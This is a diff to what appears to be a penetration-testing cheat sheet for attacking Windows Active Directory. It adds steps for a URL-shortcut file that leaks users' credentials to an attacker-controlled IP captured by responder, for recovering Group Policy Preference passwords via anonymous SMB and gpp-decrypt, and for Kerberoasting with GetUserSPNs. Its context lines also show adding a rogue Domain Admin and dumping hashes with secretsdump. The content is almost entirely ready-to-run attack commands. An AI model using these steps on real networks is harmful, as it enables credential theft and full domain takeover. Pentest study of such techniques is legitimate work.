@@ -79,3 +79,44 @@ meterpreter> net group "Domain Admins" badboy /ADD /DOMAIN
 
 secretsdump.py <Domain>/badboy:'password123'@<IP>
 ```
+# URL File Attacks
+- Make an internet shortcut file (Example: "@test.url")
+- Put the file into the shared directory on SMB
+```text
+[InternetShortcut]
+URL=blah
+WorkingDirectory=blah
+IconFile=\\<IP>\%USERNAME%.icon
+IconIndex=1
+```
+- Set up the responder.
+```bash
+responder -I eth0 -v
+```
+When the user moves to the shared directory credentials data intercepts through the responder.
+
+# GPP Attacks
+- Using Metasploit.
+```bash
+use auxiliary/scanner/smb/smb_enum_gpp
+```
+- Using SMBclient, Check for anonymous login allowed
+```bash
+smbclient -L \\\\<IP>\\
+
+smbclient \\\\<IP>\\<anonymous login allowed share>
+prompt off
+recurse on
+mget *
+```
+- Check for **Group.xml** file
+- Copy the cpassword and run cmd to decrypt it.
+```bash
+ gpp-decrypt <cPassword>
+```
+- Using GetUserSPNs we can dump credentials.
+```bash
+ GetUserSPNs.py <Domain/username:password> -dc-ip <DC IP> -request
+```
+
+
